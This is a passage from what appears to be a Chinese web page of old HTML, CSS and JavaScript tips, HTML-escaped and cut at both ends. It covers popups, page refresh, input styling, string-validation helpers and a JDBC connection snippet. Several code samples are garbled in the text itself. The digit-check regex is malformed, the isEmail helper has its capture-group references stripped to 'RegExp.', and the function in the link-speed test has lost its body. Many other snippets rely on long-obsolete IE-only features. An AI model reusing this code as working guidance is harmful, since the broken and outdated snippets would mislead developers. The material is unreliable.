style=&quot;border:1 solid #000000&quot;&gt; 或&lt;input type=text style=&quot;border-left:none; border-right:none; border-top:none; border-bottom: 1 solid #000000&quot;&gt;&lt;/textarea&gt; &lt;div&gt;&lt;span&gt;&amp;&lt;layer&gt;的区别？ 123&lt;div&gt;(division)用来定义大段的页面元素，会产生转行 &lt;span&gt;用来定义同一行内的元素，跟&lt;div&gt;的唯一区别是不产生转行 &lt;layer&gt;是ns的标记，ie不支持，相当于&lt;div&gt; 让弹出窗口总是在最上面: 1&lt;body onblur=&quot;this.focus();&quot;&gt; 不要滚动条? 123456789让竖条没有: &lt;body style=&quot;overflow:scroll;overflow-y:hidden&quot;&gt; &lt;/body&gt; 让横条没有: &lt;body style=&quot;overflow:scroll;overflow-x:hidden&quot;&gt; &lt;/body&gt; 两个都去掉？更简单了 &lt;body scroll=&quot;no&quot;&gt; &lt;/body&gt; 23.怎样去掉图片链接点击后，图片周围的虚线？ 1&lt;a href=&quot;http://www.180it.com/admin.php#&quot; onFocus=&quot;this.blur()&quot;&gt;&lt;img src=&quot;/blog/logo.jpg&quot; border=0&gt;&lt;/a&gt; 电子邮件处理提交表单 123&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;mailto:****@***.com&quot; enctype=&quot;text/plain&quot;&gt; &lt;input type=submit&gt;&lt;/form&gt; 在打开的子窗口刷新父窗口的代码里如何写？ 1window.opener.location.reload() 如何设定打开页面的大小 12&lt;body onload=&quot;top.resizeTo(300,200);&quot;&gt;打开页面的位置&lt;body onload=&quot;top.moveBy(300,200);&quot;&gt; 在页面中如何加入不是满铺的背景图片,拉动页面时背景图不动 12345&lt;STYLE&gt; body &#123;background-image:url(/blog/logo.gif); background-repeat:no-repeat; background-position:center;background-attachment: fixed&#125; &lt;/STYLE&gt; 检查一段字符串是否全由数字组成 12345&lt;script&gt;&lt;!--function checkNum(str)&#123;return str.match(//D/)==null&#125;alert(checkNum(&quot;1232142141&quot;))alert(checkNum(&quot;123214214a1&quot;))// --&gt;&lt;/script&gt; 获得一个窗口的大小 1document.body.clientWidth; document.body.clientHeight 怎么判断是否是字符 12if (/[^/x00-/xff]/g.test(s)) alert(&quot;含有汉字&quot;);else alert(&quot;全是字符&quot;); TEXTAREA自适应文字行数的多少 12&lt;textarea rows=1 name=s1 cols=27 onpropertychange=&quot;this.style.posHeight=this.scrollHeight&quot;&gt;&lt;/textarea&gt; 日期减去天数等于第二个日期 123456789101112&lt;script&gt;function cc(dd,dadd)&#123;//可以加上错误处理var a = new Date(dd)a = a.valueOf()a = a - dadd * 24 * 60 * 60 * 1000a = new Date(a)alert(a.getFullYear() + &quot;年&quot; + (a.getMonth() + 1) + &quot;月&quot; + a.getDate() + &quot;日&quot;)&#125;cc(&quot;12/23/2002&quot;,2)&lt;/script&gt; 选择了哪一个Radio 1234567891011&lt;HTML&gt;&lt;script language=&quot;vbscript&quot;&gt;function checkme()for each ob in radio1if ob.checked then window.alert ob.valuenextend function&lt;/script&gt;&lt;BODY&gt;&lt;INPUT name=&quot;radio1&quot; type=&quot;radio&quot; value=&quot;style&quot; checked&gt;Style&lt;INPUT name=&quot;radio1&quot; type=&quot;radio&quot; value=&quot;barcode&quot;&gt;Barcode&lt;INPUT type=&quot;button&quot; value=&quot;check&quot; onclick=&quot;checkme()&quot;&gt;&lt;/BODY&gt;&lt;/HTML&gt; 脚本永不出错 12345678&lt;SCRIPT&gt; &lt;!-- Hide function killErrors() &#123; return true; &#125; window.onerror = killErrors; // --&gt; &lt;/SCRIPT&gt; ENTER键可以让光标移到下一个输入框 1&lt;input onkeydown=&quot;if(event.keyCode==13)event.keyCode=9&quot;&gt; 检测某个网站的链接速度：把如下代码加入区域中: 1234567891011121314151617181920212223242526272829&lt;script&gt;tim=1setInterval(&quot;tim++&quot;,100)b=1var autourl=new Array()autourl[1]=&quot;www.180it.com&quot;autourl[2]=&quot;javacool.3322.net&quot;autourl[3]=&quot;www.sina.com.cn&quot;autourl[4]=&quot;www.nuaa.edu.cn&quot;autourl[5]=&quot;www.cctv.com&quot;function butt()&#123;document.write(&quot;&lt;form name=autof&gt;&quot;)for(var i=1;i&lt;autourl.length;i++)document.write(&quot;&lt;input type=text name=txt&quot;+i+&quot; size=10 value=&quot;/blog/测试中......&gt;&quot; =》&lt;input type=text name=url&quot;+i+&quot; size=40&gt; =》&lt;input type=button value=GO onclick=window.open(this.form.url&quot;+i+&quot;.value)&gt;&lt;br/&gt;&quot;)document.write(&quot;&lt;input type=submit value=刷新&gt;&lt;/form&gt;&quot;)&#125;butt()function auto(url)elseb++&#125;function run()&#123;for(var i=1;i&lt;autourl.length;i++)document.write(&quot;&lt;img src=http://&quot;+autourl+&quot;/&quot;+Math.random()+&quot; width=1 height=1 onerror=auto(&quot;http://&quot;+autourl+&quot;&quot;)&gt;&quot;)&#125;run()&lt;/script&gt; 各种样式的光标 12345678910111213141516171819auto ：标准光标default ：标准箭头hand ：手形光标wait ：等待光标text ：I形光标vertical-text ：水平I形光标no-drop ：不可拖动光标not-allowed ：无效光标help ：?帮助光标all-scroll ：三角方向标move ：移动标crosshair ：十字标e-resizen-resizenw-resizew-resizes-resizese-resizesw-resize 页面进入和退出的特效 123456789101112131415161718192021222324252627进入页面&lt;meta http-equiv=&quot;Page-Enter&quot; content=&quot;revealTrans(duration=x, transition=y)&quot;&gt;推出页面&lt;meta http-equiv=&quot;Page-Exit&quot; content=&quot;revealTrans(duration=x, transition=y)&quot;&gt; 这个是页面被载入和调出时的一些特效。duration表示特效的持续时间，以秒为单位。transition表示使用哪种特效，取值为1-23:0 矩形缩小 1 矩形扩大 2 圆形缩小3 圆形扩大 4 下到上刷新 5 上到下刷新6 左到右刷新 7 右到左刷新 8 竖百叶窗9 横百叶窗 10 错位横百叶窗 11 错位竖百叶窗12 点扩散 13 左右到中间刷新 14 中间到左右刷新15 中间到上下16 上下到中间 17 右下到左上18 右上到左下 19 左上到右下 20 左下到右上21 横条 22 竖条 23 以上22种随机选择一种 在规定时间内跳转 1&lt;META http-equiv=V=&quot;REFRESH&quot; content=&quot;5;URL=http://www.williamlong.info&quot;&gt; 网页是否被检索 12345678&lt;meta name=&quot;ROBOTS&quot; content=&quot;属性值&quot;&gt;其中属性值有以下一些:属性值为&quot;all&quot;: 文件将被检索，且页上链接可被查询；属性值为&quot;none&quot;: 文件不被检索，而且不查询页上的链接；属性值为&quot;index&quot;: 文件将被检索；属性值为&quot;follow&quot;: 查询页上的链接；属性值为&quot;noindex&quot;: 文件不检索，但可被查询链接；属性值为&quot;nofollow&quot;: 文件不被检索，但可查询页上的链接。 最大化窗口？ 123456&lt;script&gt;&lt;!--self.moveTo(0,0)self.resizeTo(screen.availWidth,screen.availHeight)//--&gt;&lt;/script&gt; 解决问题：由于层与下拉框之间的优先级是：下拉框 &gt; 层，因此在显示的时候，会因为优先级的次序而会出现如上问题。（如果几个元素都是层的话，我们可以通过层的 z-index 属性来设置）解决办法就是：给层中放一个优先级比下拉框更高的元素（iframe），从而解决此问题！具体解决代码如下： 12345678910111213141516&lt;div id=&quot;menu&quot; style=&quot;position:absolute; visibility:hidden; top:20px; left:20px; width:100px; height:200px; background-color:#6699cc;&quot;&gt;&lt;table&gt; &lt;tr&gt;&lt;td&gt;item 1&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;item 2&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;item 3&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;item 4&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;item 5&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;iframe src=&quot;/blog/javascript:false&quot; style=&quot;position:absolute; visibility:inherit; top:0px; left:0px; width:100px; height:200px; z-index:-1; filter=&#x27;progid:DXImageTransform.Microsoft.Alpha(style=0,opacity=0)&#x27;;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;a href=&quot;http://www.180it.com/admin.php#&quot; onclick=&quot;document.getElementById(&#x27;menu&#x27;).style.visibility=&#x27;visible&#x27;&quot;&gt;menu&lt;/a&gt;&lt;form&gt; &lt;select&gt;&lt;option&gt;A form selection list&lt;/option&gt;&lt;/select&gt;&lt;/form&gt; 输入框也可以做的很漂亮了 1234567891011121314151617181920212223242526272829303132&lt;div align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;hao&quot; value=&quot;yes&quot;&gt; 外向数：&lt;input name=answer style=&quot;color: rgb(255,0,0); border-left: medium none; border-right: medium none; border-top: medium none; border-bottom: 1px solid rgb(192,192,192)&quot;&gt; 没回答的题数：&lt;input name=unanswer id=&quot;unanswer&quot; style=&quot;color: rgb(255,0,0); border-left: medium none; border-right: medium none; border-top: medium none; border-bottom: 1px solid rgb(192,192,192)&quot;&gt; &lt;br/&gt; 总得分: &lt;input name=score id=&quot;score&quot; style=&quot;color: rgb(255,0,0); border-left: medium none; border-right: medium none; border-top: medium none; border-bottom: 1px solid rgb(192,192,192)&quot;&gt; 结论: &lt;input name=xgjg id=&quot;xgjg&quot; style=&quot;color: rgb(255,0,0); border-left: medium none; border-right: medium none; border-top: medium none; border-bottom: 1px solid rgb(192,192,192)&quot;&gt; &lt;br/&gt; &lt;br/&gt; &lt;input onClick=processForm(this.form) style=&quot;FONT-FAMILY: 宋体; FONT-SIZE: 9pt&quot; type=button value=查看结果 name=&quot;button&quot;&gt; &lt;input type=&quot;reset&quot; name=&quot;Submit&quot; value=&quot;重做&quot;&gt; &lt;/div&gt;注意：修改&lt;body&gt;为&lt;body onload=&quot;max.Click()&quot;&gt;即为打开最大化窗口，而如果改为&lt;body onload=&quot;min.Click()&quot;&gt;就变为窗口一打开就最小化&lt;object id=&quot;min&quot; type=&quot;application/x-oleobject&quot; classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;&gt; &lt;param name=&quot;Command&quot; value=&quot;Minimize&quot;&gt; &lt;/object&gt; &lt;object id=&quot;max&quot; type=&quot;application/x-oleobject&quot; classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;&gt; &lt;param name=&quot;Command&quot; value=&quot;Maximize&quot;&gt; &lt;/object&gt;&lt;/body&gt; 页面自动刷新（说明） 当你做网页时，是不是有的时候想让你的网页自动不停刷新，或者过一段时间自动跳转到另外一个你自己设定的页面？其实实现这个效果非常地简单，而且这个效果甚至不能称之为特效。你只要把如下代码加入你的网页中就可以了。 1231，页面自动刷新：把如下代码加入&lt;head&gt;区域中&lt;meta http-equiv=&quot;refresh&quot; content=&quot;20&quot;&gt;,其中20指每隔20秒刷新一次页面.2，页面自动跳转：把如下代码加入&lt;head&gt;区域中&lt;meta http-equiv=&quot;refresh&quot; content=&quot;20;url=http://www.williamlong.info&quot;&gt;,其中20指隔20秒后跳转到http://www.180it.com页面。 页面自动关闭 15000是指时间&lt;body onLoad=&quot;setTimeout(window.close, 5000)&quot;&gt; 弹出窗口自动关闭 10秒后弹出窗口自动关闭 1234567891011121314151617181920212223242526272829注意：在新的tan.htm的body中要加 &lt;onLoad=&quot;closeit()&quot;&gt;head&lt;script&gt;&lt;!--var gt = unescape(&#x27;%3e&#x27;);var popup = null;var over = &quot;Launch Pop-up Navigator&quot;;popup = window.open(&#x27;&#x27;, &#x27;popupnav&#x27;, &#x27;width=225,height=235,resizable=1,scrollbars=auto&#x27;);if (popup != null) &#123;if (popup.opener == null) &#123;popup.opener = self; &#125;popup.location.href = &#x27;tan.htm&#x27;;&#125;// --&gt;&lt;/script&gt;&lt;body&gt;注意：这段代码是在新建文件中的&lt;script&gt; function closeit() &lt;/script&gt;这个可不是&lt;iframe&gt;(引用）呀。是直接调用的。以下代码加入&lt;body&gt;区域&lt;object type=&quot;text/x-scriptlet&quot; width=&quot;800&quot; height=&quot;1000&quot; data=&quot;../index.htm&quot;&gt;&lt;/object&gt; iframe自适应高度代码 12345678910111213var adjustIframe = function (id) &#123; var iframe = document.getElementById(id) var idoc = iframe.contentWindow &amp;&amp; iframe.contentWindow.document || iframe.contentDocument; var callback = function () &#123; var iheight = Math.max(idoc.body.scrollHeight, idoc.documentElement.scrollHeight); //取得其高 iframe.style.height = iheight + &quot;px&quot;; &#125; if (iframe.attachEvent) &#123; iframe.attachEvent(&quot;onload&quot;, callback); &#125; else &#123; iframe.onload = callback &#125;&#125; HTML代码如下所示： 1234567891011&lt;iframe id=&quot;js_sub_web&quot; width=&quot;80%&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowTransparency=&quot;true&quot; src=&quot;http://www.cnblogs.com/rubylouvre/archive/2009/09/15/1566722.html&quot;&gt;&lt;/iframe&gt;===&lt;iframe id=&quot;js_sub_web&quot; width=&quot;80%&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowTransparency=&quot;true&quot; src=&quot;http://www.cnblogs.com/rubylouvre/archive/2009/09/15/1566722.html&quot;&gt;&lt;/iframe&gt;=== 使用代码：window.onload = function()&#123; adjustIframe(&quot;js_sub_web&quot;);&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192/*** 一些常用的javascript函数(方法)** 为便于使用，均书写成String对象的方法* 把他保存为.js文件，可方便的扩展字符串对象的功能** 方法名 功 能* ----------- --------------------------------* Trim 删除首位空格* Occurs 统计指定字符出现的次数* isDigit 检查是否由数字组成* isAlpha 检查是否由数字字母和下划线组成* isNumber 检查是否为数* lenb 返回字节数* isInChinese 检查是否包含汉字* isEmail 简单的email检查* isDate 简单的日期检查，成功返回日期对象* isInList 检查是否有列表中的字符字符* isInList 检查是否有列表中的字符字符*//*** 删除首尾空格 ***/String.prototype.Trim = function() &#123;return this.replace(/(^\\s*)|(\\s*$)/g, &quot;&quot;);&#125;/*** 统计指定字符出现的次数 ***/String.prototype.Occurs = function(ch) &#123;// var re = eval(&quot;/[^&quot;+ch+&quot;]/g&quot;);// return this.replace(re, &quot;&quot;).length;return this.split(ch).length-1;&#125;/*** 检查是否由数字组成 ***/String.prototype.isDigit = function() &#123;var s = this.Trim();return (s.replace(/\\d/g, &quot;&quot;).length == 0);&#125;/*** 检查是否由数字字母和下划线组成 ***/String.prototype.isAlpha = function() &#123;return (this.replace(/\\w/g, &quot;&quot;).length == 0);&#125;/*** 检查是否为数 ***/String.prototype.isNumber = function() &#123;var s = this.Trim();return (s.search(/^[+-]?[0-9.]*$/) &gt;= 0);&#125;/*** 返回字节数 ***/String.prototype.lenb = function() &#123;return this.replace(/[^\\x00-\\xff]/g,&quot;**&quot;).length;&#125;/*** 检查是否包含汉字 ***/String.prototype.isInChinese = function() &#123;return (this.length != this.replace(/[^\\x00-\\xff]/g,&quot;**&quot;).length);&#125;/*** 简单的email检查 ***/String.prototype.isEmail = function() &#123;var strr;var mail = this;var re = /(\\w+@\\w+\\.\\w+)(\\.\\w*)(\\.\\w*)/i;re.exec(mail);if(RegExp.!=&quot;&quot; &amp;&amp; RegExp.!=&quot;.&quot; &amp;&amp; RegExp.!=&quot;.&quot;)strr = RegExp.+RegExp.+RegExp.;elseif(RegExp.!=&quot;&quot; &amp;&amp; RegExp.!=&quot;.&quot;)strr = RegExp.+RegExp.;elsestrr = RegExp.;return (strr==mail);&#125;/*** 简单的日期检查，成功返回日期对象 ***/String.prototype.isDate = function() &#123;var p;var re1 = /(\\d)[年./-](\\d)[月./-](\\d)[日]?$/;var re2 = /(\\d)[月./-](\\d)[日./-](\\d)[年]?$/;var re3 = /(\\d)[月./-](\\d)[日./-](\\d)[年]?$/;if(re1.test(this)) &#123;p = re1.exec(this);return new Date(p[1],p[2],p[3]);&#125;if(re2.test(this)) &#123;p = re2.exec(this);return new Date(p[3],p[1],p[2]);&#125;if(re3.test(this)) &#123;p = re3.exec(this);return new Date(p[3],p[1],p[2]);&#125;return false;&#125;/*** 检查是否有列表中的字符字符 ***/String.prototype.isInList = function(list) &#123;var re = eval(&quot;/[&quot;+list+&quot;]/&quot;);return re.test(this);&#125; .文本框焦点问题 onBlur:当失去输入焦点后产生该事件 onFocus:当输入获得焦点后，产生该文件 Onchange:当文字值改变时，产生该事件 Onselect:当文字加亮后，产生该文件 &lt;input type=&quot;text&quot; value=&quot;郭强&quot; onfocus=&quot;if(value==&#x27;郭强&#x27;) &#123;value=&#x27;&#x27;&#125;&quot; onblur=&quot;if (value==&#x27;&#x27;) &#123;value=&#x27;郭强&#x27;&#125;&quot;&gt;点击时文字消失，失去焦点时文字再出现 字串4 2.网页按钮的特殊颜色 &lt;input type=button name=&quot;Submit1&quot; value=&quot;郭强&quot; size=10 class=s02 字串5 style=&quot;background-color:rgb(235,207,22)&quot;&gt; 3.鼠标移入移出时颜色变化 &lt;input type=&quot;submit&quot; value=&quot;找吧&quot; name=&quot;B1&quot; onMouseOut=this.style.color=&quot;blue&quot; onMouseOver=this.style.color=&quot;red&quot; class=&quot;button&quot;&gt; 4.平面按钮 &lt;input type=submit value=订阅 style=&quot;border:1px solid :#666666; height:17px; width:25pt; font-size:9pt; BACKGROUND-COLOR: #E8E8FF; color:#666666&quot; name=&quot;submit&quot;&gt; 5.按钮颜色变化 &lt;input type=text name=&quot;nick&quot; style=&quot;border:1px solid #666666; font-size:9pt; height:17px;BACKGROUND-COLOR: #F4F4FF; color:#ff6600&quot; size=&quot;15&quot; maxlength=&quot;16&quot;&gt; 6.平面输入框 &lt;input type=&quot;text&quot; name=&quot;T1&quot; size=&quot;20&quot; style=&quot;border-style: solid; border-width: 1&quot;&gt; 7.使窗口变成指定的大小 &lt;script&gt; window.resizeTo(300,283); &lt;/script&gt; 8. 使文字上下滚动 &lt;marquee direction=up scrollamount=1 scrolldelay=100 onmouseover=&#x27;this.stop()&#x27; onmouseout=&#x27;this.start()&#x27; height=60 &gt; &lt;!-- head_scrolltext --&gt; &lt;tr&gt; &lt;td&gt; 共和国 &lt;/table&gt; &lt;!-- end head_scrolltext --&gt; &lt;/marquee&gt; 字串8 9. 状态栏显示该页状态 &lt;base onmouseover=&quot;window.status=&#x27;网站建设 http://www.webmake.cn/&#x27; ;return true&quot;&gt; 10.可以点击文字实现radio选项的选定 &lt;br&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;input type=&quot;radio&quot; name=&quot;regtype&quot; value=&quot;A03&quot; id=&quot;A03&quot;&gt; &lt;label for=&quot;A03&quot;&gt; 情侣 : 一次注册两个帐户&lt;/label&gt; &lt;br&gt; 11.可以在文字域的font写onclick事件 12.打印&lt;/a&gt;打印网页 &lt;a href=&#x27;javascript:window.print ()&#x27;&gt; 13.线型输入框 &lt;input type=&quot;text&quot; name=&quot;key&quot; size=&quot;12&quot; value=&quot;关键字&quot; onFocus=this.select() onMouseOver=this.focus() class=&quot;line&quot;&gt; 14.显示文档最后修改日期 &lt;script &gt; function hi(str) &#123; document.write(document.lastModified) alert(&quot;hi&quot;+str+&quot;!&quot;) &#125; &lt;/script&gt; 15.可以在鼠标移到文字上时就触发事件 &lt;html&gt; &lt;head&gt; &lt;script language=&quot;LiveScript&quot;&gt; &lt;!-- Hiding function hello() &#123; alert(&quot;哈罗!&quot;); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;&quot; onMouseOver=&quot;hello()&quot;&gt;link&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; 16.可以根据网页上的选项来确定页面颜色 &lt;HTML&gt; &lt;HEAD&gt; &lt;TITLE&gt;background.html&lt;/TITLE&gt; &lt;/HEAD&gt; &lt;SCRIPT&gt; &lt;!-- function bgChange(selObj) &#123; newColor = selObj.options[selObj.selectedIndex].text; document.bgColor = newColor; selObj.selectedIndex = -1; &#125; //--&gt; &lt;/SCRIPT&gt; &lt;BODY STYLE=&quot;font-family:Arial&quot;&gt; &lt;B&gt;Changing Background Colors&lt;/B&gt; &lt;BR&gt; &lt;FORM&gt; &lt;SELECT SIZE=&quot;8&quot; onChange=&quot;bgChange(this);&quot;&gt; &lt;OPTION&gt;Red &lt;OPTION&gt;Orange &lt;OPTION&gt;Yellow &lt;OPTION&gt;Green &lt;OPTION&gt;Blue &lt;OPTION&gt;Indigo &lt;OPTION&gt;Violet &lt;OPTION&gt;White &lt;OPTION&gt;pink &lt;/SELECT&gt; &lt;/FORM&gt; &lt;/BODY&gt; &lt;/HTML&gt; 17.将按钮的特征改变 &lt;style type=&quot;text/css&quot;&gt; &lt;!-- .style1 &#123; font-size: 12px; background: #CCCCFF; border-width: thin thin thin thin; border-color: #CCCCFF #CCCCCC #CCCCCC #CCCCFF&#125; .style2 &#123; font-size: 12px; font-weight: bold; background: #CCFFCC; border-width: thin medium medium thin; border-color: #CCFF99 #999999 #999999 #CCFF99&#125; --&gt; &lt;/style&gt; 本例按钮的代码如下： &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提 交&quot; onmouseover=&quot;this.className=&#x27;style2&#x27;&quot; onmouseout=&quot;this.className=&#x27;style1&#x27;&quot; class=&quot;style1&quot;&gt; 18.改变按钮的图片. &lt;style type=&quot;text/css&quot;&gt; &lt;!-- .style3 &#123; font-size: 12px; background: url(image/buttonbg1.gif); border: 0px; width: 60px; height: 22px&#125; .style4 &#123; font-size: 12px; font-weight: bold; background: url(image/buttonbg2.gif); border: 0px 0; width: 60px; height: 22px&#125; --&gt; &lt;/style&gt; 本例的按钮代码如下： &lt;input type=&quot;submit&quot; name=&quot;Submit2&quot; value=&quot;提 交&quot; onmouseover=&quot;this.className=&#x27;style4&#x27;&quot; onmouseout=&quot;this.className=&#x27;style3&#x27;&quot; class=&quot;style3&quot;&gt; 19.打印页面 &lt;div align=&quot;center&quot;&gt;&lt;a class=content href=&quot;javascript:doPrint();&quot;&gt;打印本稿&lt;/a&gt;&lt;/div&gt; 20.可以直接写html语言 document.write(&quot;&quot;); 21.改变下拉框的颜色 &lt;select name=&quot;classid&quot; onChange=&quot;changelocation(document.myform.classid.options[document.myform.classid.selectedIndex].value)&quot; size=&quot;1&quot; style=&quot;color:#008080;font-size: 9pt&quot;&gt; 22.转至目标URL window.location=&quot;http://guoguo&quot; 23.传递该object的form UpdateSN(&#x27;guoqiang99267&#x27;,this.form) function UpdateSN(strValue,strForm) &#123; strForm.SignInName.value = strValue; return false; &#125; 24.文字标签 &lt;label for=&quot;AltName4&quot;&gt;&lt;input name=&quot;AltName&quot; type=&quot;RADIO&quot; tabindex=&quot;931&quot; id=&quot;AltName4&quot; &gt;guoqiang99859&lt;/label&gt; 25.layer2为组件的ID，可以控制组件是否可见 document.all.item(&#x27;Layer2&#x27;).style.display = &quot;block&quot;; document.all.item(&#x27;Layer2&#x27;).style.display = &quot;none&quot;;// 26.将页面加入favorite中 &lt;script &gt; &lt;!-- function Addme()&#123; url = &quot;http://your.site.address&quot;; //你自己的主页地址 title = &quot;Your Site Name&quot;; //你自己的主页名称 window.external.AddFavorite(url,title); --&gt; &lt;/script&gt;// 27.过10秒自动关闭页面 &lt;script &gt; function closeit() &#123; setTimeout(&quot;self.close()&quot;，10000) &#125; &lt;/script &gt; 28.可以比较字符的大小 char=post.charAt(i); if(!(&#x27;0&#x27;&lt;=char&amp;&amp;char&lt;=&#x27;9&#x27;)) 29.将字符转化为数字 month = parseInt(char) 30.点击value非空的选项时转向指定连接 &lt;select onchange=&#x27;if(this.value!=&quot;&quot;)window.open(this.value)&#x27; class=&quot;textinput&quot;&gt; &lt;option selected&gt;主办单位&lt;/option&gt; &lt;option&gt;-----------------&lt;/option&gt; &lt;option value=&quot;http://www.bjd.com.cn/&quot;&gt;北京日报&lt;/option&gt; &lt;option value=&quot;http://www.ben.com.cn/&quot;&gt;北京晚报&lt;/option&gt; &lt;/select&gt; 31.改变背景颜色 &lt;td width=* class=dp bgColor=#FAFBFC onmouseover=&quot;this.bgColor=&#x27;#FFFFFF&#x27;;&quot; onmouseout=&quot;this.bgColor=&#x27;#FAFBFC&#x27;;&quot;&gt; 32.改变文字输入框的背景颜色 &lt;style&gt; .input2 &#123;background-image: url(&#x27;../images/inputbg.gif&#x27;); font-size: 12px; background-color: #D0DABB;border-top-width:1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px&#125; &lt;/style&gt; &lt;input name=content type=text size=&quot;47&quot; class=&quot;input2&quot; maxlength=&quot;50&quot;&gt; 33.改变水平线的特征 &lt;hr size=&quot;0&quot; noshade color=&quot;#C0C0C0&quot;&gt; 34.传递参数的方式 &lt;a href=&quot;vote.asp?CurPage=8&amp;id=3488&quot;&gt;8&lt;/a&gt; 35.页内跳转 &lt;a href=&quot;#1&quot;&gt;1&lt;/a&gt; &lt;a href=&quot;#2&quot;&gt;2&lt;/a&gt; &lt;a href=&quot;#3&quot;&gt;3&lt;/a&gt; &lt;a href=&quot;#4&quot;&gt;4&lt;/a&gt; &lt;a href=&quot;#5&quot;&gt;5&lt;/a&gt; &lt;a href=&quot;#6&quot;&gt;6&lt;/a&gt; &lt;a href=&quot;#7&quot;&gt;7&lt;/a&gt; &lt;a name=&quot;1&quot;&gt;dfdf&lt;/a&gt; &lt;a name=&quot;2&quot;&gt;dfdf&lt;/a&gt;// 36.两个按键一起按下 if(event.ctrlKey &amp;&amp; window.event.keyCode==13)// 37.刷新页面 javascript:this.location.reload()// 38.将网页的按钮使能 &lt;SCRIPT&gt; function haha() &#123; for(var i=0;i&lt;document.form1.elements.length;i++) &#123; if(document.form1.elements.name.indexOf(&quot;bb&quot;)!=-1) document.form1.elements.disabled=!document.form1.elements.disabled; &#125; &#125; &lt;/SCRIPT&gt; &lt;BODY&gt;&lt;form name=form1 &gt; &lt;INPUT TYPE=&quot;button&quot; NAME=&quot;aa &quot; value=cindy onclick=haha() &gt; &lt;INPUT TYPE=&quot;button&quot; NAME=&quot;bb &quot; value=guoguo &gt; &lt;INPUT TYPE=&quot;button&quot; NAME=&quot;bb &quot; value=guoguo &gt; 39.文字移动 &lt;marquee scrollamount=3 onmouseover=this.stop(); onmouseout=this.start(); &gt; 40.双击网页自动跑 &lt;SCRIPT&gt; var currentpos,timer; function initialize() &#123; timer=setInterval(&quot;scrollwindow()&quot;,1); &#125; function sc() &#123; clearInterval(timer); &#125; function scrollwindow() &#123; currentpos=document.body.scrollTop; window.scroll(0,++currentpos); if (currentpos != document.body.scrollTop) sc(); &#125; document.onmousedown=sc document.ondblclick=initialize &lt;/SCRIPT&gt;// 41.后退 &lt;INPUT TYPE=&quot;button&quot; onclick= window.history.back() value=back &gt; 42.前进 &lt;INPUT TYPE=&quot;button&quot; onclick= window.history.forward() value= forward &gt; 43.刷新 &lt;INPUT TYPE=&quot;button&quot; onclick= document.location.reload() value=reload &gt; 44.转向指定网页 document.location=&quot;http://ww&quot;或者document.location.assign(&quot;&quot;) 45.在网页上显示实时时间 &lt;SCRIPT&gt; var clock_id; window.onload=function() &#123; clock_id=setInterval(&quot;document.form1.txtclock.value=(new Date);&quot;,1000) &#125; &lt;/SCRIPT&gt;// 46.可以下载文件 document.location.href=&quot;目标文件&quot;// 47.连接数据库 import java.sql.*; String myDBDriver=&quot;sun.jdbc.odbc.JdbcOdbcDriver&quot;; Class.forName(myDBDriver); Connection conn=DriverManager.getConnection(&quot;jdbc:odbc:firm&quot;,&quot;username&quot;,&quot;password&quot;); Statement stmt=conn.createStatement(); ResultSet rs=stmt.executeQuery(sql); rs.getString(&quot;column1&quot;);// 48.可以直接在页面“div”内写下所需内容 &lt;INPUT TYPE=&quot;button&quot; onclick=&quot;a1.innerHTML=&#x27;&lt;font color=red&gt;*&lt;/font&gt;&#x27;&quot;&gt; &lt;div id= a1 &gt;&lt;/div&gt;// 49.可以改变页面上的连接的格式，使其为双线 &lt;style&gt; A:link &#123;text-decoration: none; color:#0000FF; font-family: 宋体&#125; A:visited &#123;text-decoration: none; color: #0000FF; font-family: 宋体&#125; A:hover &#123;text-decoration: underline overline; color: FF0000&#125; &lt;/style&gt; &lt;style&gt; A:link &#123;text-decoration: none; color:#0000FF; font-family: 宋体&#125; A:visited &#123;text-decoration: none; color: #0000FF; font-family: 宋体&#125; A:hover &#123;text-decoration: underline overline line-through; color: FF0000&#125; TH&#123;FONT-SIZE: 9pt&#125; TD&#123;FONT-SIZE: 9pt&#125; body &#123;SCROLLBAR-FACE-COLOR: #A9D46D; SCROLLBAR-HIGHLIGHT-COLOR: #e7e7e7;SCROLLBAR-SHADOW-COLOR:#e7e7e7; SCROLLBAR-3DLIGHT-COLOR: #000000; LINE-HEIGHT: 15pt; SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #e7e7e7;&#125; INPUT&#123;BORDER-TOP-WIDTH: 1px; PADDING-RIGHT: 1px; PADDING-LEFT: 1px; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 9pt; BORDER-LEFT-COLOR: #cccccc; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #cccccc; PADDING-BOTTOM: 1px; BORDER-TOP-COLOR: #cccccc; PADDING-TOP: 1px; HEIGHT: 18px; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #cccccc&#125; DIV,form ,OPTION,P,TD,BR&#123;FONT-FAMILY: 宋体; FONT-SIZE: 9pt&#125; textarea, select &#123;border-width: 1; border-color: #000000; background-color: #efefef; font-family: 宋体; font-size: 9pt; font-style: bold;&#125; .text &#123; font-family: &quot;宋体&quot;; font-size: 9pt; color: #003300; border: #006600 solid; border-width: 1px 1px 1px 1px&#125; &lt;/style&gt;完整的css 50.新建frame &lt;a href=&quot;javascript:newframe(&#x27;http://www.163.net/help/a_little/index.html&#x27;,&#x27;http://www.163.net/help/a_little/a_13.html&#x27;)&quot;&gt;&lt;img alt=帮助 border=0 